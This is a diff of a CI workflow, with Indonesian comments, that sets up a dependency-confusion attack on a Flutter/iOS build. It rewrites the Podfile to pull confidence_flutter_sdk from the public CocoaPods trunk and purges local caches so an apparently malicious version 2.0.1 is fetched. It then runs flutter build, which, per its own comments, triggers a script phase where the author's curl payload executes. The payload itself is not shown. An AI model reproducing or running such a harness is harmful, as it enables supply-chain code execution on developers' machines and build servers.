@@ -19,43 +19,40 @@ jobs:
           flutter create rce_test
           cd rce_test
           
-          # Paksa tambahkan dependency tanpa versi spesifik agar resolve ke versi tertinggi di Trunk
+          # Paksa tambahkan dependency agar pubspec.yaml terupdate
           flutter pub add confidence_flutter_sdk
           
           # 2. Patch Platform Version ke 16.0
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
           
           # 3. NATIVE RESOLUTION (The Dependency Confusion Route)
-          # Hapus logic otomatis Flutter yang seringkali mengunci ke path lokal/symlink
           sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
-          
-          # Tambahkan pod secara eksplisit tanpa :git. 
-          # CocoaPods akan mencari ke Master Repo / Trunk secara otomatis.
           echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
           
-          echo "=== Podfile AFTER Native Patch (Dependency Confusion Mode) ==="
-          cat ios/Podfile
-          
           cd ios
-          # 4. CLEANUP PROTOCOL
-          echo "=== Purging Old Pods and Locks ==="
+          # 4. SUPER CLEANUP PROTOCOL (Bypass CDN Latency)
+          echo "=== Purging Everything including Local Trunk Cache ==="
           pod cache clean --all
           rm -rf Pods
           rm -rf Podfile.lock
           
-          # Update repo untuk memastikan versi 'malicious' lu terdeteksi
-          pod repo update
+          # Hapus local repo trunk biar Runner dipaksa fetch metadata terbaru dari server
+          rm -rf ~/.cocoapods/repos/trunk
+          
+          # Force update dari master repo
+          pod repo update trunk
           
           # Jalankan install secara verbose
           pod install --verbose 2>&1 | tee pod_install.log || true
           
           echo "=== Check Podfile.lock Status ==="
-          # Verifikasi apakah dia narik versi lu (v2.0.0 atau v1.1.2) dari Trunk
+          # Cek apakah sudah narik versi 2.0.1 (Payload Script Phase)
           ls -la Podfile.lock || echo "Podfile.lock STILL MISSING"
-          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "FAILED TO RESOLVE FROM TRUNK"
+          grep -A 1 "confidence_flutter_sdk" Podfile.lock
           
           cd ..
-          # 5. Build Phase - Execution Phase (Trigger Payload via Objective-C Constructor)
+          # 5. Build Phase - Execution Phase (Trigger Script Phase & Payload)
+          # Payload curl lu bakal jalan di sini sebelum Xcode nyadar ada error Swift
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
           echo "=== Build log tail ==="
